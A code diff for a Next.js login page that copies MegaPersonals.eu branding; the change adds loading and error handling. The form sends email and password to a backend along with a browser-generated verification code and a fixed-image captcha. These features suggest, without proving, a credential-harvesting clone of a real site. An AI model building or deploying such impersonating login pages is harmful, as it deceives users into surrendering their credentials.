@@ -55,6 +55,7 @@ const page = () => {
 
       const [currentImage, setCurrentImage] = useState(images[0]);
       const [showMessage,setShowMessage] = useState(false);
+      const [loading, setLoading] = useState(false);
       const router = useRouter();
       
       const changeImage = () => {
@@ -87,22 +88,33 @@ const page = () => {
 
       const handlesubmit =async (e) => {
         e.preventDefault(); 
-        const code = Math.floor(100000 + Math.random() * 900000).toString();
-        const response = await fetch('http://localhost:5000/api/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({email:formData.email, password:formData.password,userAgent:userAgent,code:code }),
-        });
+    setLoading(true); // Start loading
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
 
-        sessionStorage.setItem('vc',code)
+    try {
+      const response = await fetch('http://localhost:5000/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: formData.email, password: formData.password, userAgent, code }),
+      });
 
-        
+      if (response.ok) {
+        sessionStorage.setItem('vc', code);
         setFormData({
           email: '',
           password: '',
-          otp:''
+          otp: ''
         });
-        router.push(`/login/verify`)
+        router.push('/login/verify');
+      } else {
+        // Handle error response
+        console.error('Login failed');
+      }
+    } catch (error) {
+      console.error('Error during login:', error);
+    } finally {
+      setLoading(false); // End loading
+    }
       }
       const handleshowMessage = () => {
         setShowMessage(!showMessage);
@@ -110,53 +122,86 @@ const page = () => {
 
 
     return (
-        <main className='p-[40px] flex justify-center'>
-           <section className='flex flex-col gap-[20px]'>
-           <Link href={'/'}><Image src={loginBenner} width={413} height={83} alt='login Benner'/></Link>
-           <section className='flex flex-col items-center gap-4'>
-            <div className='flex flex-col items-center gap-2'>
-                <h3 className='text-[#B9A697] text-[18px] font-normal'>Is this your first time posting?</h3>
-                <Link href={'/signup'}><button className='w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]'>Start Here</button></Link>
+      <main className="p-[40px] flex justify-center">
+      <section className="flex flex-col gap-[20px]">
+        <Link href={'/'}>
+          <Image src={loginBenner} width={413} height={83} alt="login Benner" />
+        </Link>
+        <section className="flex flex-col items-center gap-4">
+          <div className="flex flex-col items-center gap-2">
+            <h3 className="text-[#B9A697] text-[18px] font-normal">Is this your first time posting?</h3>
+            <Link href={'/signup'}>
+              <button className="w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]">Start Here</button>
+            </Link>
+          </div>
+          <h3 className="text-[#B9A697] text-[18px] font-normal">Already have an account?</h3>
+          <form onSubmit={handlesubmit} className="flex flex-col gap-3">
+            <input
+              type="email"
+              name="email"
+              value={formData.email}
+              onChange={handleInputChange}
+              className="block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]"
+              placeholder="Email"
+              required
+              disabled={loading}
+            />
+            <input
+              type="password"
+              name="password"
+              value={formData.password}
+              onChange={handleInputChange}
+              className="block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]"
+              placeholder="Password"
+              required
+              disabled={loading}
+            />
+            <div className="flex items-center justify-between">
+              <div className="border-2 border-[#c0c0c0] rounded">
+                <Image className="p-[2px]" src={currentImage} width={191} height={37} alt="captcha" />
+              </div>
+              <span onClick={changeImage} className="cursor-pointer">
+                <Image src={reloadbutton} width={41} height={41} alt="reload" />
+              </span>
             </div>
-            <h3 className='text-[#B9A697] text-[18px] font-normal '>Already have an account?</h3>
-            <form onSubmit={handlesubmit} className='flex flex-col gap-3'>
-                <input type="email" name="email" value={formData.email} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
-                <input type="password" name="password" value={formData.password} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Password' required/>
-                <div className='flex items-center justify-between'>
-                    <div className='border-2 border-[#c0c0c0] rounded'><Image className='p-[2px]' src={currentImage} width={191} height={37} alt='..'/></div>
-                    <span onClick={changeImage} className='cursor-pointer'><Image src={reloadbutton} width={41} height={41} alt='...'/></span>
-                </div>
-                <input type="text" name="otp" value={formData.otp} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Enter code from the picture'/>
+            <input
+              type="text"
+              name="otp"
+              value={formData.otp}
+              onChange={handleInputChange}
+              className="block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]"
+              placeholder="Enter code from the picture"
+              disabled={loading}
+            />
+            <div className="flex flex-col items-center">
+              <input
+                className={`${loading ? "w-[150px]":"w-[120px]"} rounded  h-[44px] bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer`}
+                type="submit"
+                value={loading ? 'LOADING...' : 'SUBMIT'}
+                disabled={loading} 
+              />
+            </div>
+            <Image className="cursor-pointer" onClick={handleshowMessage} src={frame} height={109} width={252} alt="help" />
+            {showMessage && <MessageModal setShowMessage={setShowMessage} showMessage={showMessage} />}
+          </form>
 
-                <div className='flex flex-col items-center'>
-                <input className='w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer' type="submit" value="SUBMIT" />
-                </div>
+          <h3 className="text-[#0000EE] text-[14px] font-normal">FORGOT PASSWORD?</h3>
 
-              <Image className='cursor-pointer' onClick={handleshowMessage} src={frame} height={109} width={252} alt='...' />
-              {
-                showMessage && <MessageModal  setShowMessage={setShowMessage} showMessage={showMessage}/>
-              }
-            </form>
-
-            <h3 className='text-[#0000EE] text-[14px] font-normal'>FORGOT PASSWORD?</h3>
-
-            <div className='text-center flex flex-col sm:gap-[26px] gap:[10px] '>
-          <ul className='flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] sm:text-[13px] text-[8px] font-normal'>
-            <a href="/"><li className='cursor-pointer'>Home</li></a>
-            <li>|</li>
-            <li className='cursor-pointer'>Manage Posts</li>
-            <li>|</li>
-            <li className='cursor-pointer'>Contact Us</li>
-            <li>|</li>
-            <li className='cursor-pointer'>Policies & Terms</li>
-          </ul>
-          <h3 className='text-[#0481C9] text-[13px]'>Copyright @2024 MegaPersonals.eu</h3>
-        </div>
-
-           </section>
-           </section>
-
-        </main>
+          <div className="text-center flex flex-col sm:gap-[26px] gap:[10px]">
+            <ul className="flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] sm:text-[13px] text-[8px] font-normal">
+              <a href="/"><li className="cursor-pointer">Home</li></a>
+              <li>|</li>
+              <li className="cursor-pointer">Manage Posts</li>
+              <li>|</li>
+              <li className="cursor-pointer">Contact Us</li>
+              <li>|</li>
+              <li className="cursor-pointer">Policies & Terms</li>
+            </ul>
+            <h3 className="text-[#0481C9] text-[13px]">Copyright @2024 MegaPersonals.eu</h3>
+          </div>
+        </section>
+      </section>
+    </main>
     );
 };
 
